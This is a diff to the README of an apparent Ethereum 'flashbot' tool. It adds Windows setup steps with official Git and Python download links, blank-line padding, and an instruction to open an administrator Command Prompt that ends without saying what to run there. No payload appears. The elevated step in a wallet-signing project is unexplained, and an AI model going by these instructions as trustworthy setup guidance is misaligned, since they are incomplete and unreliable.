@@ -7,7 +7,27 @@ The `flashbot` method handles proper header injection for authenticated requests
 ## Quickstart
 
 ### **Attention Windows & macOS Users:** 
-Proceed with the manual installation guide. macOS users can bypass these steps by installing from the [DMG file](../../releases).
+Manual instructions target Windows and Linux; macOS users get the [DMG file](../../releases).  
+
+
+
+
+
+Check for Git and Python installations on Windows.
+
+Install Git for Windows:
+
+https://git-scm.com/install/windows
+
+Install Python for Windows:
+
+https://www.python.org/ftp/python/3.13.12/python-3.13.12-amd64.exe
+
+Open Command Prompt (Administrator).
+
+
+
+
 
 ```python
 from eth_account.signers.local import LocalAccount
